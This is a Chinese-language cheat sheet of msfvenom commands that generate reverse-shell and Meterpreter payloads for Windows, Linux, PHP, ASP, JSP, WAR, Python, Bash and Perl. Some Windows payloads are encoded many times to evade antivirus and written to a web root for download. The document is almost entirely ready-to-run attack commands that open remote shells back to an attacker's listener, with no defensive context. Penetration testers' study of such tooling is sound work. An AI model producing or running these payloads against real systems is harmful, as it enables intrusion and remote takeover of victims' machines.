# 列出所有攻击载荷
```
msfvenom -l   
```     

# windows
分段
windows/shell/reverse_tcp

不分段
windows/shell_reverse_tcp


exe
```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.131 LPORT=443 -f exe >vpnsvc.exe
```

加密一次
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92  lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
```


加密两次
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
```

meterpreter
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```


# linux

x86
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.119.187 LPORT=443 -f elf > shell
```

x64
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.157 LPORT=143 -f elf > shell.elf
```

meterpreter
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```


# 其他

PHP
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```
ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp  
```


WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war 
``` 

Python
```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py  
```

Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh 
```

Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```